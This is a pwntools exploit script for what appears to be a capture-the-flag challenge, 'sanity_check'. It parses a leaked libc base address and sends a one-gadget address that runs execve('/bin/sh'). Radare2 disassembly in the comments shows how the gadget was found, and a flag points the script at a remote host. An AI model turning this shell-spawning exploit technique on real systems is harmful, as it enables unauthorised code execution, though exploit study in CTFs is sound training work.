#!/usr/bin/env python
from pwn import *

p = process('./sanity_check_76955449d82f05cbd7f84fa011da93ce') if '--live' not in sys.argv else remote('54.174.215.251', 1337)

# libc base addr - 0x7fe7b1405000
r = 'libc base addr - 0x([0-9a-f]{12})\n'
s = p.recvregex(r)
print(s)
libc_base = int(re.findall(r,s)[0], 16)

'''
[0x00046640]> axt sym.execve
c 0xc143a jmp sym.execve
C 0xc1745 call sym.execve
C 0xc170c call sym.execve
C 0xc1b84 call sym.execve
C 0xc1c1b call sym.execve
C 0xc198b call sym.execve
C 0xc1a7a call sym.execve
C 0x46556 call sym.execve
C 0xc155f call sym.execve
C 0xc13b1 call sym.execve
C 0xe4ced call sym.execve
C 0xe4dab call sym.execve
C 0xe49b8 call sym.execve
C 0xe4a7d call sym.execve
C 0xe58db call sym.execve
C 0xe6833 call sym.execve
'''

'''
| |||||||   ; JMP XREF from 0x000e4acf (fcn.000e4690)
| --------> 0x000e4a76    488b9510ffff.  mov rdx, qword [rbp-local_30]
| |||||||   0x000e4a7d    e8aec8fdff     call sym.execve
| |||||||   0x000e4a82    488b05df932d.  mov rax, qword [rip + 0x2d93df] ; [0x3bde68:8]=0
| |||||||   0x000e4a89    4c89f4         mov rsp, r14
| |||||||   0x000e4a8c    648b10         mov edx, dword fs:[rax]
| ========< 0x000e4a8f    e9b4feffff     jmp 0xe4948
| |||||||   ; JMP XREF from 0x000e486f (fcn.000e4690)
| |||||`--> 0x000e4a94    488bb5d8feff.  mov rsi, qword [rbp-local_37]
| ||||| |   0x000e4a9b    bf07000000     mov edi, 7
| ||||| |   0x000e4aa0    e8abc20000     call sym.getrlimit64
| ||||`===< 0x000e4aa5    e9cbfdffff     jmp 0xe4875
| ||||  |   0x000e4aaa    660f1f440000   nop word [rax + rax]
| ||||  |   ; JMP XREF from 0x000e494d (fcn.000e4690)
| --------> 0x000e4ab0    83fa02         cmp edx, 2
| ========< 0x000e4ab3    0f84adfeffff   je 0xe4966
| ||||  |   0x000e4ab9    bf7f000000     mov edi, 0x7f
| ||||  |   0x000e4abe    e80dc8fdff     call sym._Exit
| ||||  |   0x000e4ac3    0f1f440000     nop dword [rax + rax]
| ||||  |   ; JMP XREF from 0x000e4a3e (fcn.000e4690)
| --------> 0x000e4ac8    488d3d0c8209.  lea rdi, [rip + 0x9820c]      ; 0x17ccdb ; str._bin_sh ; "/bin/sh" @ 0x17ccdb
| ========< 0x000e4acf    eba5           jmp 0xe4a76
'''

libc_magic = libc_base + 0x000e4ac8

print(libc_magic)
#gdb.attach(p)
p.sendline(str(libc_magic))
p.interactive()
